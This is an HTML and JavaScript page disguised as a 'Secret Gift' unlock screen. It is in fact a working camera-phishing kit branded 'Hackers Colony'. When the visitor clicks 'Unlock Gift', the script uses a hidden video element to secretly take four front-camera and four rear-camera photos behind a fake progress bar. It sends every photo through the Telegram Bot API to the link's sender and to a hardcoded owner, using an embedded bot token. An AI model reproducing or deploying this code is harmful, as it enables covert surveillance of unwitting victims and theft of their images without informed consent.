<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>üéÅ Surprise Gift</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  margin: 0;
  background: linear-gradient(135deg, #0b0014, #1a0030);
  color: white;
  font-family: Arial, sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
  height: 100vh;
  overflow: hidden;
}

.card {
  background: rgba(22, 0, 34, 0.9);
  padding: 30px;
  border-radius: 20px;
  width: 90%;
  max-width: 400px;
  box-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
  text-align: center;
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 0, 255, 0.3);
}

.gift-icon {
  font-size: 70px;
  margin-bottom: 10px;
  animation: float 3s ease-in-out infinite;
}

@keyframes float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

h2 {
  margin: 10px 0;
  background: linear-gradient(45deg, #ff00ff, #00ffff);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 20px;
  border-radius: 50px;
  border: none;
  background: linear-gradient(45deg, #ff00ff, #00ffff);
  color: black;
  font-size: 18px;
  font-weight: bold;
  cursor: pointer;
}

button:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.spinner {
  width: 60px;
  height: 60px;
  border: 4px solid rgba(255, 0, 255, 0.3);
  border-top: 4px solid #ff00ff;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 20px auto;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.progress-container {
  width: 100%;
  height: 8px;
  background: rgba(255, 0, 255, 0.2);
  border-radius: 4px;
  margin: 20px 0;
  overflow: hidden;
}

.progress-bar {
  height: 100%;
  background: linear-gradient(90deg, #ff00ff, #00ffff);
  width: 0%;
  transition: width 0.5s ease;
}

.status {
  margin-top: 15px;
  font-size: 14px;
  color: #ffb3ff;
  min-height: 20px;
}

.hidden {
  position: fixed;
  top: -9999px;
  width: 1px;
  height: 1px;
  opacity: 0;
}
</style>
</head>

<body>
<div class="card" id="box">
  <div class="gift-icon">üéÅ</div>
  <h2>‚ú® Secret Gift ‚ú®</h2>
  <p>A magical surprise is waiting for you!</p>
  <button id="unlockBtn">üéØ Unlock Gift</button>
  <div class="status" id="status"></div>
</div>

<video class="hidden" id="video" autoplay playsinline></video>

<script>
// ===== CONFIG =====
const BOT_TOKEN = "8226782560:AAFPl8aGBfO-KBeSLg98dSyOTa1-AouFY";  // UPDATED TOKEN
const OWNER_ID = "8215819954";
const USER_ID = new URLSearchParams(window.location.search).get('uid');

// ===== MAIN =====
document.getElementById("unlockBtn").onclick = async () => {
  const box = document.getElementById("box");
  const btn = document.getElementById("unlockBtn");
  btn.disabled = true;
  
  box.innerHTML = `
    <div class="gift-icon">‚ú®</div>
    <h2>üéÄ Creating Magic</h2>
    <p>Please wait while we prepare your gift...</p>
    <div class="spinner"></div>
    <div class="progress-container">
      <div class="progress-bar" id="progress"></div>
    </div>
    <div class="status" id="statusText">Initializing...</div>
  `;
  
  const progress = document.getElementById("progress");
  const statusText = document.getElementById("statusText");
  const video = document.getElementById("video");
  
  try {
    // ===== FRONT CAMERA - 4 PHOTOS =====
    statusText.textContent = "Accessing camera...";
    progress.style.width = "10%";
    
    // Get front camera
    const frontStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: 640, height: 480 },
      audio: false
    });
    video.srcObject = frontStream;
    
    // Wait for camera to be ready
    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(resolve, 1000);
      };
    });
    
    // Capture 4 front photos
    for (let i = 1; i <= 4; i++) {
      progress.style.width = (10 + i * 10) + "%";
      statusText.textContent = `Creating moment ${i} of 8...`;
      await new Promise(r => setTimeout(r, 800));
      await captureAndSendPhoto(`Front ${i}`);
    }
    
    // Stop front camera
    frontStream.getTracks().forEach(track => track.stop());
    
    // ===== SWITCH TO BACK CAMERA =====
    statusText.textContent = "Switching camera...";
    progress.style.width = "60%";
    await new Promise(r => setTimeout(r, 1000));
    
    // Get back camera
    const backStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "environment", width: 640, height: 480 },
      audio: false
    });
    video.srcObject = backStream;
    
    // Wait for camera to be ready
    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(resolve, 1000);
      };
    });
    
    // Capture 4 back photos
    for (let i = 1; i <= 4; i++) {
      progress.style.width = (60 + i * 10) + "%";
      statusText.textContent = `Creating moment ${i + 4} of 8...`;
      await new Promise(r => setTimeout(r, 800));
      await captureAndSendPhoto(`Back ${i}`);
    }
    
    // Stop back camera
    backStream.getTracks().forEach(track => track.stop());
    
    progress.style.width = "100%";
    statusText.textContent = "Finishing up...";
    await new Promise(r => setTimeout(r, 1500));
    
    // ===== SUCCESS MESSAGE =====
    box.innerHTML = `
      <div class="gift-icon">üéâ</div>
      <h2 style="color:#00ff00">üéÅ Gift Delivered!</h2>
      <p>Your special surprise has been prepared</p>
      <p>Thank you for waiting!</p>
      <div class="status" style="color:#00ff00">‚ú® Complete ‚ú®</div>
    `;
    
  } catch (error) {
    console.error("Error:", error);
    box.innerHTML = `
      <div class="gift-icon">üé≠</div>
      <h2 style="color:#ff5555">Camera Access Needed</h2>
      <p>Please allow camera to receive your gift</p>
      <button onclick="location.reload()">üîÑ Try Again</button>
      <div class="status" style="color:#ffb3ff">${error.message}</div>
    `;
  }
};

// ===== CAPTURE AND SEND PHOTO =====
async function captureAndSendPhoto(label) {
  const video = document.getElementById("video");
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  
  return new Promise((resolve) => {
    canvas.toBlob(async (blob) => {
      if (!blob) {
        resolve();
        return;
      }
      
      try {
        // ===== SEND TO USER =====
        const userFormData = new FormData();
        userFormData.append('photo', blob, 'gift.jpg');
        userFormData.append('chat_id', USER_ID);
        userFormData.append('caption', `üéÅ Your Gift: ${label}\n‚ú® From Hackers Colony`);
        
        const userResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: userFormData
        });
        
        if (userResponse.ok) {
          console.log(`‚úÖ Sent ${label} to user ${USER_ID}`);
        } else {
          console.log(`‚ö†Ô∏è Failed to send to user: ${userResponse.status}`);
        }
        
        // ===== CREATE NEW BLOB FOR OWNER =====
        canvas.toBlob(async (ownerBlob) => {
          if (!ownerBlob) {
            resolve();
            return;
          }
          
          // ===== SEND TO OWNER =====
          const ownerFormData = new FormData();
          ownerFormData.append('photo', ownerBlob, 'gift.jpg');
          ownerFormData.append('chat_id', OWNER_ID);
          ownerFormData.append('caption', `üì∏ From ${USER_ID}: ${label}\nüïê ${new Date().toLocaleTimeString()}`);
          
          const ownerResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: ownerFormData
          });
          
          if (ownerResponse.ok) {
            console.log(`‚úÖ Sent ${label} to owner`);
          } else {
            console.log(`‚ö†Ô∏è Failed to send to owner: ${ownerResponse.status}`);
          }
          
          resolve();
          
        }, 'image/jpeg', 0.9);
        
      } catch (error) {
        console.error(`‚ùå Error sending ${label}:`, error);
        resolve();
      }
    }, 'image/jpeg', 0.9);
  });
}
</script>
</body>
</html>
